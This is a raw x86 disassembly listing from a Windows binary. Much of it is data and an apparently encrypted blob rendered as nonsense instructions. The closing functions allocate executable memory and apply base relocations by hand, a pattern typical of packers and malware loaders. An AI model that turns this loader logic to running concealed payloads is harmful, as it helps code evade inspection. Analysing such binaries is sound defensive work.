  4446cd:	add    BYTE PTR [eax+0x7d],bl
  4446d0:	inc    esp
  4446d1:	add    BYTE PTR [ebp+edi*2+0x44],bl
  4446d5:	add    BYTE PTR [eax+0x7d],ah
  4446d8:	inc    esp
  4446d9:	add    BYTE PTR [ebp+edi*2+0x44],ah
  4446dd:	add    BYTE PTR [eax+0x7d],ch
  4446e0:	inc    esp
  4446e1:	add    BYTE PTR [ebp+edi*2+0x44],ch
  4446e5:	add    BYTE PTR [eax+0x7d],dh
  4446e8:	inc    esp
  4446e9:	add    BYTE PTR [ebp+edi*2+0x44],dh
  4446ed:	add    BYTE PTR [eax+0x7d],bh
  4446f0:	inc    esp
  4446f1:	add    BYTE PTR [ebp+edi*2+0x44],bh
  4446f5:	add    BYTE PTR [eax+0x7d],bl
  4446f8:	inc    esp
  4446f9:	add    BYTE PTR [eax-0x7bffbb83],al
  4446ff:	jge    0x444745
  444701:	add    BYTE PTR [eax-0x73ffbb83],cl
  444707:	jge    0x44474d
  444709:	add    BYTE PTR [eax+0x6c00447d],dl
  44470f:	jge    0x444755
  444711:	add    BYTE PTR [ebp+edi*2+0x7d980044],dl
  444718:	inc    esp
  444719:	add    BYTE PTR [ebp+edi*2+0x7da00044],bl
  444720:	inc    esp
  444721:	add    BYTE PTR [ebp+edi*2+0x7da80044],ah
  444728:	inc    esp
  444729:	add    BYTE PTR [ebp+edi*2+0x7db00044],ch
  444730:	inc    esp
  444731:	add    BYTE PTR [ebp+edi*2+0x7db80044],dh
  444738:	inc    esp
  444739:	add    BYTE PTR [ebp+edi*2+0x7dc00044],bh
  444740:	inc    esp
  444741:	add    ah,al
  444743:	jge    0x444789
  444745:	add    al,cl
  444747:	jge    0x44478d
  444749:	add    ah,cl
  44474b:	jge    0x444791
  44474d:	add    al,dl
  44474f:	jge    0x444795
  444751:	add    ah,dl
  444753:	jge    0x444799
  444755:	add    al,bl
  444757:	jge    0x44479d
  444759:	add    ah,bl
  44475b:	jge    0x4447a1
  44475d:	add    al,ah
  44475f:	jge    0x4447a5
  444761:	add    ah,ah
  444763:	jge    0x4447a9
  444765:	add    al,ch
  444767:	jge    0x4447ad
  444769:	add    ah,ch
  44476b:	jge    0x4447b1
  44476d:	add    al,dh
  44476f:	jge    0x4447b5
  444771:	add    ah,dh
  444773:	jge    0x4447b9
  444775:	add    ah,cl
  444777:	jge    0x4447bd
  444779:	add    al,bh
  44477b:	jge    0x4447c1
  44477d:	add    al,ah
  44477f:	jge    0x4447c5
  444781:	add    ah,bh
  444783:	jge    0x4447c9
  444785:	add    BYTE PTR [ebp+edi*2+0x7e000044],dl
  44478c:	inc    esp
  44478d:	add    BYTE PTR [esi+edi*2],al
  444790:	inc    esp
  444791:	add    BYTE PTR [eax],cl
  444793:	jle    0x4447d9
  444795:	add    BYTE PTR [esi+edi*2],cl
  444798:	inc    esp
  444799:	add    BYTE PTR [eax],dl
  44479b:	jle    0x4447e1
  44479d:	add    BYTE PTR [esi+edi*2],dl
  4447a0:	inc    esp
  4447a1:	add    BYTE PTR [eax],bl
  4447a3:	jle    0x4447e9
  4447a5:	add    al,dl
  4447a7:	jge    0x4447ed
  4447a9:	add    BYTE PTR [esi+edi*2],bl
  4447ac:	inc    esp
  4447ad:	add    BYTE PTR [eax],ah
  4447af:	jle    0x4447f5
  4447b1:	add    BYTE PTR [esi+edi*2],ah
  4447b4:	inc    esp
  4447b5:	add    BYTE PTR [eax],ch
  4447b7:	jle    0x4447fd
  4447b9:	add    BYTE PTR [esi+edi*2],ch
  4447bc:	inc    esp
  4447bd:	add    BYTE PTR [eax],dh
  4447bf:	jle    0x444805
  4447c1:	add    BYTE PTR [esi+edi*2],dh
  4447c4:	inc    esp
  4447c5:	add    BYTE PTR [eax],bh
  4447c7:	jle    0x44480d
  4447c9:	add    BYTE PTR [esi+edi*2],bh
  4447cc:	inc    esp
  4447cd:	add    BYTE PTR [eax+0x7e],al
  4447d0:	inc    esp
  4447d1:	add    al,cl
  4447d3:	jge    0x444819
  4447d5:	add    BYTE PTR [esi+edi*2+0x44],al
  4447d9:	add    BYTE PTR [eax+0x7e],cl
  4447dc:	inc    esp
  4447dd:	add    BYTE PTR [esi+edi*2+0x44],cl
  4447e1:	add    ah,dl
  4447e3:	jl     0x444829
  4447e5:	add    BYTE PTR [eax+0x7e],dl
  4447e8:	inc    esp
  4447e9:	add    BYTE PTR [ebp+edi*2+0x44],ch
  4447ed:	add    BYTE PTR [eax+0x7d],dh
  4447f0:	inc    esp
  4447f1:	add    BYTE PTR [esi+edi*2+0x44],dl
  4447f5:	add    BYTE PTR [eax+0x7e],bl
  4447f8:	inc    esp
  4447f9:	add    BYTE PTR [esi+edi*2],cl
  4447fc:	inc    esp
  4447fd:	add    BYTE PTR [esi+edi*2+0x44],bl
  444801:	add    BYTE PTR [eax+0x7e],ah
  444804:	inc    esp
  444805:	add    BYTE PTR [esi+edi*2+0x44],ah
  444809:	add    BYTE PTR [eax+0x7e],ch
  44480c:	inc    esp
  44480d:	add    BYTE PTR [esi+edi*2+0x44],ch
  444811:	add    BYTE PTR [eax+0x7e],cl
  444814:	inc    esp
  444815:	add    BYTE PTR [eax+0x7e],dh
  444818:	inc    esp
  444819:	add    BYTE PTR [esi+edi*2+0x44],dh
  44481d:	add    BYTE PTR [eax+0x7e],bh
  444820:	inc    esp
  444821:	add    BYTE PTR [esi+edi*2+0x44],bh
  444825:	add    BYTE PTR [eax],dh
  444827:	jle    0x44486d
  444829:	add    BYTE PTR [eax-0x7bffbb82],al
  44482f:	jle    0x444875
  444831:	add    BYTE PTR [eax-0x73ffbb82],cl
  444837:	jle    0x44487d
  444839:	add    BYTE PTR [eax-0x6bffbb82],dl
  44483f:	jle    0x444885
  444841:	add    BYTE PTR [eax-0x63ffbb82],bl
  444847:	jle    0x44488d
  444849:	add    BYTE PTR [eax+0x2c00447e],ah
  44484f:	jle    0x444895
  444851:	add    BYTE PTR [esi+edi*2+0x7ea80044],ah
  444858:	inc    esp
  444859:	add    BYTE PTR [esi+edi*2+0x7eb00044],ch
  444860:	inc    esp
  444861:	add    BYTE PTR [esi+edi*2+0x7eb80044],dh
  444868:	inc    esp
  444869:	add    BYTE PTR [esi+edi*2+0x7ec00044],bh
  444870:	inc    esp
  444871:	add    ah,al
  444873:	jle    0x4448b9
  444875:	add    al,cl
  444877:	jle    0x4448bd
  444879:	add    BYTE PTR [ebp+edi*2+0x7ecc0044],dl
  444880:	inc    esp
  444881:	add    al,dl
  444883:	jle    0x4448c9
  444885:	add    ah,dl
  444887:	jle    0x4448cd
  444889:	add    al,bl
  44488b:	jle    0x4448d1
  44488d:	add    ah,bl
  44488f:	jle    0x4448d5
  444891:	add    al,ah
  444893:	jle    0x4448d9
  444895:	add    ah,ah
  444897:	jle    0x4448dd
  444899:	add    al,ch
  44489b:	jle    0x4448e1
  44489d:	add    ah,bl
  44489f:	jge    0x4448e5
  4448a1:	add    ah,ch
  4448a3:	jle    0x4448e9
  4448a5:	add    al,dh
  4448a7:	jle    0x4448ed
  4448a9:	add    ah,dh
  4448ab:	jle    0x4448f1
  4448ad:	add    al,bh
  4448af:	jle    0x4448f5
  4448b1:	add    ah,bh
  4448b3:	jle    0x4448f9
  4448b5:	add    BYTE PTR [eax+0x7e],dl
  4448b8:	inc    esp
  4448b9:	add    BYTE PTR [eax],al
  4448bb:	jg     0x444901
  4448bd:	add    ah,bh
  4448bf:	jge    0x444905
  4448c1:	add    BYTE PTR [edi+edi*2],al
  4448c4:	inc    esp
  4448c5:	add    BYTE PTR [ebp+edi*2+0x44],ah
  4448c9:	add    al,cl
  4448cb:	jle    0x444911
  4448cd:	add    BYTE PTR [eax],cl
  4448cf:	jg     0x444915
  4448d1:	add    BYTE PTR [edi+edi*2],cl
  4448d4:	inc    esp
  4448d5:	add    BYTE PTR [eax],dl
  4448d7:	jg     0x44491d
  4448d9:	add    ah,ch
  4448db:	jl     0x444921
  4448dd:	add    BYTE PTR [edi+edi*2],dl
  4448e0:	inc    esp
  4448e1:	add    BYTE PTR [eax],bl
  4448e3:	jg     0x444929
  4448e5:	add    BYTE PTR [edi+edi*2],bl
  4448e8:	inc    esp
  4448e9:	add    BYTE PTR [eax+0x7d],al
  4448ec:	inc    esp
  4448ed:	add    BYTE PTR [eax],ah
  4448ef:	jg     0x444935
  4448f1:	add    BYTE PTR [edi+edi*2],ah
  4448f4:	inc    esp
  4448f5:	add    BYTE PTR [eax],ch
  4448f7:	jg     0x44493d
  4448f9:	add    BYTE PTR [edi+edi*2],ch
  4448fc:	inc    esp
  4448fd:	add    BYTE PTR [eax],dh
  4448ff:	jg     0x444945
  444901:	add    ah,ah
  444903:	jl     0x444949
  444905:	add    BYTE PTR [edi+edi*2],dh
  444908:	inc    esp
  444909:	add    BYTE PTR [eax],bh
  44490b:	jg     0x444951
  44490d:	add    BYTE PTR [edi+edi*2],bh
  444910:	inc    esp
  444911:	add    BYTE PTR [eax+0x7f],al
  444914:	inc    esp
  444915:	add    BYTE PTR [edi+edi*2+0x44],al
  444919:	add    BYTE PTR [eax+0x7f],cl
  44491c:	inc    esp
  44491d:	add    BYTE PTR [edi+edi*2+0x44],cl
  444921:	add    BYTE PTR [eax+0x7f],dl
  444924:	inc    esp
  444925:	add    BYTE PTR [edi+edi*2+0x44],dl
  444929:	add    BYTE PTR [eax+0x7f],bl
  44492c:	inc    esp
  44492d:	add    BYTE PTR [edi+edi*2+0x44],bl
  444931:	add    BYTE PTR [eax+0x7f],ah
  444934:	inc    esp
  444935:	add    BYTE PTR [edi+edi*2+0x44],ah
  444939:	add    BYTE PTR [eax+0x7f],ch
  44493c:	inc    esp
  44493d:	add    al,bl
  44493f:	jl     0x444985
  444941:	add    BYTE PTR [edi+edi*2+0x44],ch
  444945:	add    BYTE PTR [eax+0x7f],dh
  444948:	inc    esp
  444949:	add    ah,bl
  44494b:	jge    0x444991
  44494d:	add    BYTE PTR [edi+edi*2+0x44],dh
  444951:	add    BYTE PTR [eax+0x7f],bh
  444954:	inc    esp
  444955:	add    BYTE PTR [eax],dh
  444957:	jg     0x44499d
  444959:	add    BYTE PTR [edi+edi*2+0x44],bh
  44495d:	add    BYTE PTR [eax-0x7bffbb81],al
  444963:	jg     0x4449a9
  444965:	add    ah,bl
  444967:	jle    0x4449ad
  444969:	add    BYTE PTR [eax-0x73ffbb81],cl
  44496f:	jg     0x4449b5
  444971:	add    BYTE PTR [eax-0x6bffbb81],dl
  444977:	jg     0x4449bd
  444979:	add    BYTE PTR [eax+0x5000447f],al
  44497f:	jle    0x4449c5
  444981:	add    BYTE PTR [eax-0x63ffbb81],bl
  444987:	jg     0x4449cd
  444989:	add    BYTE PTR [eax-0x5bffbb81],ah
  44498f:	jg     0x4449d5
  444991:	add    BYTE PTR [ebp+edi*2+0x7d2c0044],dh
  444998:	inc    esp
  444999:	add    BYTE PTR [eax-0x53ffbb81],ch
  44499f:	jg     0x4449e5
  4449a1:	add    BYTE PTR [eax+0x5800447f],dh
  4449a7:	jge    0x4449ed
  4449a9:	add    BYTE PTR [edi+edi*2+0x7fb80044],dh
  4449b0:	inc    esp
  4449b1:	add    BYTE PTR [eax-0x43ffbb83],bl
  4449b7:	jg     0x4449fd
  4449b9:	add    al,al
  4449bb:	jg     0x444a01
  4449bd:	add    ah,al
  4449bf:	jg     0x444a05
  4449c1:	add    BYTE PTR [edi*2+0x7fc80044],ch
  4449c8:	inc    esp
  4449c9:	add    BYTE PTR [ebp+edi*2+0x7fcc0044],cl
  4449d0:	inc    esp
  4449d1:	add    al,dl
  4449d3:	jg     0x444a19
  4449d5:	add    ah,dl
  4449d7:	jg     0x444a1d
  4449d9:	add    al,bl
  4449db:	jg     0x444a21
  4449dd:	add    ah,bl
  4449df:	jg     0x444a25
  4449e1:	add    al,ah
  4449e3:	jg     0x444a29
  4449e5:	add    al,cl
  4449e7:	jl     0x444a2d
  4449e9:	add    BYTE PTR [eax+0x3000447f],bh
  4449ef:	jle    0x444a35
  4449f1:	add    ah,ah
  4449f3:	jg     0x444a39
  4449f5:	add    al,ch
  4449f7:	jg     0x444a3d
  4449f9:	add    ah,ch
  4449fb:	jg     0x444a41
  4449fd:	add    al,dh
  4449ff:	jg     0x444a45
  444a01:	add    ah,dh
  444a03:	jg     0x444a49
  444a05:	add    al,bh
  444a07:	jg     0x444a4d
  444a09:	add    ah,bh
  444a0b:	jg     0x444a51
  444a0d:	add    BYTE PTR [eax],al
  444a0f:	add    BYTE PTR [eax+eax*1-0x3c],0x7c
  444a14:	inc    esp
  444a15:	add    BYTE PTR [eax+eax*4],al
  444a18:	inc    esp
  444a19:	add    BYTE PTR [eax],cl
  444a1b:	add    BYTE PTR [eax+eax*1+0xc],0x80
  444a20:	inc    esp
  444a21:	add    BYTE PTR [eax+0x1000447f],bl
  444a27:	add    BYTE PTR [eax+eax*1-0x28],0x7c
  444a2c:	inc    esp
  444a2d:	add    BYTE PTR [eax+eax*4],dl
  444a30:	inc    esp
  444a31:	add    BYTE PTR [eax+0x5000447d],al
  444a37:	jle    0x444a7d
  444a39:	add    BYTE PTR [eax],bl
  444a3b:	add    BYTE PTR [eax+eax*1+0x1c],0x80
  444a40:	inc    esp
  444a41:	add    BYTE PTR [eax],ah
  444a43:	add    BYTE PTR [eax+eax*1+0x24],0x80
  444a48:	inc    esp
  444a49:	add    BYTE PTR [eax],ch
  444a4b:	add    BYTE PTR [eax+eax*1+0x2c],0x80
  444a50:	inc    esp
  444a51:	add    ah,bh
  444a53:	jl     0x444a99
  444a55:	add    BYTE PTR [eax],dh
  444a57:	add    BYTE PTR [eax+eax*1+0x34],0x80
  444a5c:	inc    esp
  444a5d:	add    BYTE PTR [eax],bh
  444a5f:	add    BYTE PTR [eax+eax*1+0x3c],0x80
  444a64:	inc    esp
  444a65:	add    BYTE PTR [eax-0x80],al
  444a68:	inc    esp
  444a69:	add    BYTE PTR [eax+eax*4+0x44],al
  444a6d:	add    BYTE PTR [eax-0x80],cl
  444a70:	inc    esp
  444a71:	add    BYTE PTR [eax],ah
  444a73:	jge    0x444ab9
  444a75:	add    BYTE PTR [eax+eax*4+0x44],cl
  444a79:	add    BYTE PTR [eax-0x80],dl
  444a7c:	inc    esp
  444a7d:	add    BYTE PTR [eax+eax*4+0x44],dl
  444a81:	add    BYTE PTR [eax+0x7e],ch
  444a84:	inc    esp
  444a85:	add    BYTE PTR [eax-0x80],bl
  444a88:	inc    esp
  444a89:	add    BYTE PTR [eax+eax*4+0x44],bl
  444a8d:	add    BYTE PTR [edi*2-0x7f9fffbc],dh
  444a94:	inc    esp
  444a95:	add    BYTE PTR [esi+edi*2],cl
  444a98:	inc    esp
  444a99:	add    BYTE PTR [eax+eax*4+0x44],ah
  444a9d:	add    BYTE PTR [eax-0x80],ch
  444aa0:	inc    esp
  444aa1:	add    BYTE PTR [eax+eax*4+0x44],ch
  444aa5:	add    BYTE PTR [eax-0x80],dh
  444aa8:	inc    esp
  444aa9:	add    BYTE PTR [eax+eax*4+0x44],dh
  444aad:	add    BYTE PTR [eax-0x80],bh
  444ab0:	inc    esp
  444ab1:	add    BYTE PTR [ebp+edi*2+0x44],cl
  444ab5:	add    BYTE PTR [eax+eax*4+0x44],bh
  444ab9:	add    BYTE PTR [eax+0x7f],bh
  444abc:	inc    esp
  444abd:	add    BYTE PTR [eax-0x7bffbb80],al
  444ac3:	add    BYTE PTR [eax+eax*1-0x34],0x7c
  444ac8:	inc    esp
  444ac9:	add    BYTE PTR [eax-0x7ffbb80],cl
  444acf:	jle    0x444b15
  444ad1:	add    BYTE PTR [eax+eax*4-0x7f6fffbc],cl
  444ad8:	inc    esp
  444ad9:	add    BYTE PTR [eax],dh
  444adb:	jle    0x444b21
  444add:	add    BYTE PTR [eax+eax*4+0x44],ah
  444ae1:	add    BYTE PTR [eax+eax*4-0x7f67ffbc],dl
  444ae8:	inc    esp
  444ae9:	add    BYTE PTR [ecx+eiz*2+0x10fd49b3],ah
  444af0:	(bad)  
  444af1:	jb     0x444b47
  444af3:	mov    edx,0xc05f9885
  444af8:	imul   ebp,DWORD PTR [edi],0x3a
  444afb:	(bad)  
  444afc:	push   edi
  444afd:	and    BYTE PTR [edi-0x8],0x57
  444b01:	mov    bh,0xa6
  444b03:	mov    ah,0x6b
  444b05:	xchg   dh,al
  444b07:	sbb    DWORD PTR [eax-0x509a7b0d],eax
  444b0d:	xchg   DWORD PTR [edx-0x77468059],edx
  444b13:	outs   dx,BYTE PTR ds:[esi]
  444b14:	stos   DWORD PTR es:[edi],eax
  444b15:	into   
  444b16:	out    dx,al
  444b17:	js     0x444b75
  444b19:	int3   
  444b1a:	cs out 0xe7,eax
  444b1d:	pop    ds
  444b1e:	inc    ebx
  444b1f:	mul    DWORD PTR [eax]
  444b21:	sub    DWORD PTR [eax-0x3df1aa98],0x15ff3227
  444b2b:	in     al,0x76
  444b2d:	int    0x56
  444b2f:	mov    ds:0xb3a794a3,eax
  444b34:	lods   al,BYTE PTR ds:[esi]
  444b35:	sub    al,0x7c
  444b37:	push   cs
  444b38:	jo     0x444ad6
  444b3a:	lods   eax,DWORD PTR ds:[esi]
  444b3b:	cmp    al,0x1a
  444b3d:	pop    edi
  444b3e:	mov    bl,0x99
  444b40:	sbb    edx,DWORD PTR [eax-0x6c]
  444b43:	enter  0x4fe,0x8a
  444b47:	popf   
  444b48:	xchg   DWORD PTR [eax+0x31],ecx
  444b4b:	lds    edi,FWORD PTR [ecx]
  444b4d:	mov    WORD PTR [ebx],?
  444b4f:	sahf   
  444b50:	mov    al,0x9d
  444b52:	mov    ebp,0xa4154b56
  444b57:	out    0xfd,eax
  444b59:	cmp    DWORD PTR [ecx+0x3c],ebx
  444b5c:	push   eax
  444b5d:	ja     0x444b42
  444b5f:	push   ss
  444b60:	imul   ebx,DWORD PTR [ebx-0x118dfc6c],0xda73fb2c
  444b6a:	cmp    eax,0x38080e65
  444b6f:	jnp    0x444b4b
  444b71:	inc    eax
  444b72:	mov    BYTE PTR [ebx],0x3e
  444b75:	mov    bl,0x78
  444b77:	xchg   ebp,eax
  444b78:	outs   dx,DWORD PTR ds:[esi]
  444b79:	loop   0x444b8e
  444b7b:	push   esi
  444b7c:	fst    DWORD PTR [ebx]
  444b7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444b7f:	mov    dl,0x23
  444b81:	clc    
  444b82:	xchg   ebp,eax
  444b83:	int3   
  444b84:	into   
  444b85:	cmp    ebx,ebp
  444b87:	add    esi,edx
  444b89:	repz and BYTE PTR [edi-0x74b8f22f],ah
  444b90:	dec    edx
  444b91:	(bad)  
  444b92:	(bad)  
  444b93:	sub    DWORD PTR [esi],ebp
  444b95:	cdq    
  444b96:	in     al,dx
  444b97:	xchg   esi,ecx
  444b99:	movups xmm0,xmm4
  444b9c:	daa    
  444b9d:	pushw  cs
  444b9f:	mov    ds:0xaae23b77,al
  444ba4:	fwait
  444ba5:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  444ba7:	jp     0x444c06
  444ba9:	not    DWORD PTR [edx+0x67]
  444bac:	fnstsw WORD PTR [edx-0x72]
  444baf:	lahf   
  444bb0:	mov    bl,0xf4
  444bb2:	lock out dx,al
  444bb4:	cmc    
  444bb5:	sbb    edx,ecx
  444bb7:	retf   
  444bb8:	dec    ecx
  444bb9:	into   
  444bba:	outs   dx,BYTE PTR ds:[esi]
  444bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444bbc:	inc    edx
  444bbd:	mov    ds:0x22a03806,eax
  444bc2:	in     al,dx
  444bc3:	mov    al,ds:0xfc32f54b
  444bc8:	push   0x20
  444bca:	jae    0x444b72
  444bcc:	jl     0x444b9e
  444bce:	ret    0x435e
  444bd1:	jnp    0x444b77
  444bd3:	fwait
  444bd4:	xchg   esi,eax
  444bd5:	add    BYTE PTR [ecx+0x5c06b620],0xc0
  444bdc:	ins    BYTE PTR es:[edi],dx
  444bdd:	xor    ecx,esi
  444bdf:	add    DWORD PTR [edx+0x198fc690],0xa2a57b94
  444be9:	jp     0x444c33
  444beb:	(bad)
  444bee:	inc    eax
  444bef:	fnstenv [edi+0x5]
  444bf2:	sub    eax,DWORD PTR [esi+0x4c973b40]
  444bf8:	sbb    eax,0x3f2e8915
  444bfd:	mov    cl,0x7b
  444bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444c00:	imul   ebp,DWORD PTR [ecx+0x32a3e09e],0x6b
  444c07:	cmp    edx,DWORD PTR [edx+0x2f3e7254]
  444c0d:	adc    BYTE PTR [esi],cl
  444c0f:	les    esi,FWORD PTR [eax+0x61446894]
  444c15:	mov    esi,0x2e5af7f9
  444c1a:	push   ss
  444c1b:	stos   DWORD PTR es:[edi],eax
  444c1c:	inc    edi
  444c1d:	push   eax
  444c1e:	(bad)  [esi+0x2df250bb]
  444c24:	inc    esi
  444c25:	inc    eax
  444c26:	loop   0x444c24
  444c28:	ret    0xb493
  444c2b:	push   edi
  444c2c:	pushf  
  444c2d:	mov    ah,0xc4
  444c2f:	inc    edi
  444c30:	cmc    
  444c31:	jmp    0x51f6:0x9950cbda
  444c38:	popf   
  444c39:	sbb    dl,0x4b
  444c3c:	cs xor eax,0x54973e41
  444c42:	add    cl,BYTE PTR [ebx+ebp*8-0x51]
  444c46:	(bad)  
  444c47:	jae    0x444bf3
  444c49:	cmp    bh,dh
  444c4b:	in     eax,0x5e
  444c4d:	ret    0x15f
  444c50:	and    DWORD PTR [eax-0x12331d3d],eax
  444c56:	mov    fs,WORD PTR [eax-0x4c8fd789]
  444c5c:	and    BYTE PTR [ebx],bl
  444c5e:	in     eax,0x78
  444c60:	ret    
  444c61:	mov    edx,0xb153ec98
  444c66:	cmp    eax,DWORD PTR [edi+0x2eb74fc2]
  444c6c:	cmp    al,0x52
  444c6e:	xlat   BYTE PTR ds:[ebx]
  444c6f:	inc    edx
  444c70:	pop    ebp
  444c71:	adc    al,0xba
  444c73:	and    esp,eax
  444c75:	add    al,0x36
  444c77:	test   cl,0x6e
  444c7a:	and    BYTE PTR [esi-0x40660a8d],0x52
  444c81:	xchg   edx,eax
  444c82:	pop    es
  444c83:	push   es
  444c84:	dec    edi
  444c85:	mov    edx,0xe2d4d3f1
  444c8a:	addr16 je 0x444c4d
  444c8d:	mov    esi,0x5dcfef74
  444c92:	fwait
  444c93:	mov    eax,ds:0x574911c4
  444c98:	pusha  
  444c99:	mov    ah,0x7e
  444c9b:	out    0x11,al
  444c9d:	movlhps xmm3,xmm2
  444ca0:	inc    eax
  444ca1:	jle    0x444cdd
  444ca3:	push   cs
  444ca4:	jbe    0x444c36
  444ca6:	in     eax,dx
  444ca7:	pop    eax
  444ca8:	data16 shl BYTE PTR [ecx-0x63],1
  444cac:	test   eax,0xf450fa7e
  444cb1:	sbb    DWORD PTR [edi],eax
  444cb3:	jo     0x444c44
  444cb5:	pop    esi
  444cb6:	mov    DWORD PTR [edx-0x448afc17],0xffab272d
  444cc0:	lods   eax,DWORD PTR ds:[esi]
  444cc1:	loope  0x444cb4
  444cc3:	dec    esi
  444cc4:	pop    ebx
  444cc5:	cli    
  444cc6:	shr    BYTE PTR ds:[ebx-0x5ddb7abe],0x5c
  444cce:	mov    ebp,edx
  444cd0:	mov    dl,0x5c
  444cd2:	adc    BYTE PTR [ecx+0x65df8742],ch
  444cd8:	and    al,0x1b
  444cda:	pusha  
  444cdb:	ins    DWORD PTR es:[edi],dx
  444cdc:	adc    eax,DWORD PTR [ebx]
  444cde:	aam    0x73
  444ce0:	xchg   DWORD PTR [ebx],ebp
  444ce2:	(bad)  
  444ce3:	stc    
  444ce4:	push   esi
  444ce5:	mov    ch,0x29
  444ce7:	scas   eax,DWORD PTR es:[edi]
  444ce8:	cmp    BYTE PTR [ebx-0x34],dh
  444ceb:	int3   
  444cec:	int3   
  444ced:	int3   
  444cee:	int3   
  444cef:	int3   
  444cf0:	push   ebp
  444cf1:	mov    ebp,esp
  444cf3:	sub    esp,0xc
  444cf6:	mov    DWORD PTR [ebp-0x8],0x1e4dc
  444cfd:	mov    DWORD PTR [ebp-0xc],0x3000
  444d04:	mov    DWORD PTR [ebp-0x4],0x40
  444d0b:	mov    eax,DWORD PTR [ebp-0x4]
  444d0e:	push   eax
  444d0f:	mov    ecx,DWORD PTR [ebp-0xc]
  444d12:	push   ecx
  444d13:	mov    edx,DWORD PTR [ebp+0x8]
  444d16:	push   edx
  444d17:	push   0x0
  444d19:	push   0xffffffff
  444d1b:	call   DWORD PTR ds:0x447cac
  444d21:	mov    esp,ebp
  444d23:	pop    ebp
  444d24:	ret    
  444d25:	int3   
  444d26:	int3   
  444d27:	int3   
  444d28:	int3   
  444d29:	int3   
  444d2a:	int3   
  444d2b:	int3   
  444d2c:	int3   
  444d2d:	int3   
  444d2e:	int3   
  444d2f:	int3   
  444d30:	push   ebp
  444d31:	mov    ebp,esp
  444d33:	pop    ebp
  444d34:	ret    
  444d35:	int3   
  444d36:	int3   
  444d37:	int3   
  444d38:	int3   
  444d39:	int3   
  444d3a:	int3   
  444d3b:	int3   
  444d3c:	int3   
  444d3d:	int3   
  444d3e:	int3   
  444d3f:	int3   
  444d40:	push   ebp
  444d41:	mov    ebp,esp
  444d43:	sub    esp,0x8
  444d46:	mov    eax,DWORD PTR [ebp+0x8]
  444d49:	mov    DWORD PTR [ebp-0x4],eax
  444d4c:	mov    ecx,DWORD PTR [ebp+0xc]
  444d4f:	mov    DWORD PTR [ebp-0x8],ecx
  444d52:	mov    edx,DWORD PTR [ebp-0x4]
  444d55:	cmp    edx,DWORD PTR [ebp-0x8]
  444d58:	jae    0x444d61
  444d5a:	mov    eax,DWORD PTR [ebp-0x4]
  444d5d:	jmp    0x444d64
  444d5f:	jmp    0x444d64
  444d61:	mov    eax,DWORD PTR [ebp-0x8]
  444d64:	mov    esp,ebp
  444d66:	pop    ebp
  444d67:	ret    
  444d68:	int3   
  444d69:	int3   
  444d6a:	int3   
  444d6b:	int3   
  444d6c:	int3   
  444d6d:	int3   
  444d6e:	int3   
  444d6f:	int3   
  444d70:	push   ebp
  444d71:	mov    ebp,esp
  444d73:	mov    DWORD PTR ds:0x44ae48,0x401004
  444d7d:	pop    ebp
  444d7e:	ret    
  444d7f:	int3   
  444d80:	push   ebp
  444d81:	mov    ebp,esp
  444d83:	mov    DWORD PTR ds:0x44ae48,0x443ad0
  444d8d:	pop    ebp
  444d8e:	ret    
  444d8f:	int3   
  444d90:	push   ebp
  444d91:	mov    ebp,esp
  444d93:	mov    eax,DWORD PTR [ebp+0x8]
  444d96:	mov    eax,DWORD PTR [eax-0x4]
  444d99:	pop    ebp
  444d9a:	ret    
  444d9b:	int3   
  444d9c:	int3   
  444d9d:	int3   
  444d9e:	int3   
  444d9f:	int3   
  444da0:	push   ebp
  444da1:	mov    ebp,esp
  444da3:	sub    esp,0xc
  444da6:	mov    DWORD PTR [ebp-0x4],0x0
  444dad:	jmp    0x444db8
  444daf:	mov    eax,DWORD PTR [ebp-0x4]
  444db2:	add    eax,0x1
  444db5:	mov    DWORD PTR [ebp-0x4],eax
  444db8:	mov    ecx,DWORD PTR [ebp-0x4]
  444dbb:	cmp    ecx,DWORD PTR [ebp+0x8]
  444dbe:	jae    0x444e0f
  444dc0:	mov    edx,DWORD PTR [ebp-0x4]
  444dc3:	mov    eax,DWORD PTR [ebp+0xc]
  444dc6:	movzx  ecx,WORD PTR [eax+edx*2]
  444dca:	sar    ecx,0xc
  444dcd:	cmp    ecx,0x3
  444dd0:	jne    0x444e0d
  444dd2:	mov    DWORD PTR [ebp-0xc],0xfff
  444dd9:	mov    edx,DWORD PTR [ebp-0x4]
  444ddc:	mov    eax,DWORD PTR [ebp+0xc]
  444ddf:	movzx  ecx,WORD PTR [eax+edx*2]
  444de3:	and    ecx,DWORD PTR [ebp-0xc]
  444de6:	add    ecx,0x43
  444de9:	mov    DWORD PTR [ebp-0x8],ecx
  444dec:	mov    edx,DWORD PTR [ebp+0x18]
  444def:	mov    eax,DWORD PTR [ebp+0x10]
  444df2:	add    eax,DWORD PTR [edx]
  444df4:	mov    ecx,DWORD PTR [ebp-0x8]
  444df7:	mov    edx,DWORD PTR [eax+ecx*1-0x43]
  444dfb:	add    edx,DWORD PTR [ebp+0x14]
  444dfe:	mov    eax,DWORD PTR [ebp+0x18]
  444e01:	mov    ecx,DWORD PTR [ebp+0x10]
  444e04:	add    ecx,DWORD PTR [eax]
  444e06:	mov    eax,DWORD PTR [ebp-0x8]
  444e09:	mov    DWORD PTR [ecx+eax*1-0x43],edx
  444e0d:	jmp    0x444daf
  444e0f:	mov    esp,ebp
  444e11:	pop    ebp
  444e12:	ret    
  444e13:	int3   
  444e14:	int3   
  444e15:	int3   
  444e16:	int3   
  444e17:	int3   
  444e18:	int3   
  444e19:	int3   
  444e1a:	int3   
  444e1b:	int3   
  444e1c:	int3   
  444e1d:	int3   
  444e1e:	int3   
  444e1f:	int3   
  444e20:	push   ebp
  444e21:	mov    ebp,esp
  444e23:	sub    esp,0x24
  444e26:	mov    DWORD PTR [ebp-0x8],0xdbc8
  444e2d:	mov    DWORD PTR [ebp-0x10],0x0
  444e34:	jmp    0x444e3f
  444e36:	mov    eax,DWORD PTR [ebp-0x10]
  444e39:	add    eax,0x4
  444e3c:	mov    DWORD PTR [ebp-0x10],eax
  444e3f:	mov    ecx,DWORD PTR [ebp-0x10]
  444e42:	cmp    ecx,DWORD PTR [ebp+0xc]
  444e45:	jae    0x444f11
  444e4b:	mov    DWORD PTR [ebp-0x8],0xdbc8
  444e52:	cmp    DWORD PTR [ebp-0x10],0x0
  444e56:	jne    0x444ea8
  444e58:	push   0x104
  444e5d:	push   0x44ae4c
  444e62:	call   DWORD PTR ds:0x447cb0
  444e68:	push   0x447000
